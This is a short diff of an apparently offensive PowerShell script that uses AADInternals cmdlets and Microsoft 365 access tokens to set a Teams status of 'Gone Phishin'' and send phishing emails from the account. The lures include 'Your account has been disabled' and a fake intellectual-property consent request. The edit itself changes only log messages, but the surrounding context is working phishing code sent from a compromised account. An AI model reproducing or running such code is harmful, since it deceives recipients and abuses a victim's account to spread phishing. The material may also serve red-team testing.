@@ -244,7 +244,7 @@ if ($targetUser) {
             Write-Output "Setting status message to 'Gone Phishin' and going wide."
             Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
             
-            Write-Output "Sending Teams messages..."
+            Write-Output "Sending messages..."
             # Send-TeamsMessageWithRetry -Recipient $user.UserPrincipalName -Message $teamsMessage
         Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $user -Subject "Your account has been disabled" -Message $teamsMessage
         }
@@ -252,6 +252,7 @@ if ($targetUser) {
         Write-Output "Setting user status message to 'Gone Phishin'"
         Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
         # Send-TeamsMessageWithRetry -Recipient $targetUser -Message $teamsMessage
+        Write-Output "Sending message..."        
         $mailuser = $targetUser
         if(!($subject)){$subject = "Third-Party Consent for use of your company's intellectual property"}
         if(!($messageContent)) { $messageContent = "We have been trying to reach you regarding use of your company's work in our upcoming calendar, please review these forms if you have any concerns or wish to object usage of your logo, etc, etc"}
